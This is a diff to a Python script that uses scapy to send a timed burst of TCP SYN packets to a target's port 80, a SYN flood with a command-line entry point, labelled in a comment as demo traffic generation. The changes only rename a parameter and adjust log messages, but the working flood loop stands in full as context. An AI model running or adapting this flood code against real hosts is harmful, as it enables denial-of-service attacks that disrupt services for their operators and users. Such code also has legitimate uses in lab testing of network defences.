@@ -14,6 +14,8 @@ from ipaddress import IPv4Address
 
 from scapy.all import IP, TCP, send  # type: ignore[import-untyped]
 
+FILE_NAME = __file__.split("/")[-1]
+
 # Default flood profile for demo traffic generation.
 DEFAULT_SYN_FLOOD_DURATION = 30
 DEFAULT_SYN_FLOOD_PPS = 200
@@ -22,14 +24,14 @@ DEFAULT_SYN_FLOOD_PPS = 200
 def syn_flood(
     target: IPv4Address,
     *,
-    duration_s: int = DEFAULT_SYN_FLOOD_DURATION,
+    duration: int = DEFAULT_SYN_FLOOD_DURATION,
     pps: int = DEFAULT_SYN_FLOOD_PPS,
 ) -> None:
     """Send a burst of TCP SYN packets to target:80.
 
     Args:
         target: Destination IPv4 address.
-        duration_s: How long to sustain the flood in seconds.
+        duration: How long to sustain the flood in seconds.
         pps: Packets per second.
     """
     if pps <= 0:
@@ -37,10 +39,10 @@ def syn_flood(
         raise ValueError(msg)
 
     interval = 1.0 / pps
-    end_time = time.monotonic() + duration_s
+    end_time = time.monotonic() + duration
     sent = 0
 
-    print(f"[syn-flood] target={target} duration={duration_s}s pps={pps}")
+    print(f"[{FILE_NAME}] target={target} {duration=}s {pps=}")
 
     while time.monotonic() < end_time:
         pkt = IP(dst=str(target)) / TCP(
@@ -52,7 +54,7 @@ def syn_flood(
         sent += 1
         time.sleep(interval)
 
-    print(f"[syn-flood] done - {sent} packets sent")
+    print(f"[{FILE_NAME}] done - {sent} packets sent")
 
 
 def _build_parser() -> argparse.ArgumentParser:
@@ -80,7 +82,7 @@ def _build_parser() -> argparse.ArgumentParser:
 def main() -> None:
     """Entry point for the script."""
     args = _build_parser().parse_args()
-    syn_flood(args.target, duration_s=args.duration, pps=args.pps)
+    syn_flood(args.target, duration=args.duration, pps=args.pps)
 
 
 if __name__ == "__main__":
